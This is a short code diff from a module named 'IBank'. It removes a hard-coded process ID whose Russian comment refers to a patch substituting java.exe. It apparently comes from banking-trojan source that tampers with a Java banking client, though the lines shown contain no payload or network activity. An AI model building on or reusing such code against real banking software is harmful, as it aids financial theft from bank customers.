@@ -116,7 +116,6 @@ namespace IBank
 		PCHAR path = (PCHAR) HEAP::Alloc(MAX_PATH);
 		if( path )
 		{
-			pid = 1234; //делаем одинаковым, так как из-за подмены java.exe патчем, у на пид становится неверным
 			pGetTempPathA( MAX_PATH, path );
 			char buf[32];
 			fwsprintfA pwsprintfA = Get_wsprintfA();
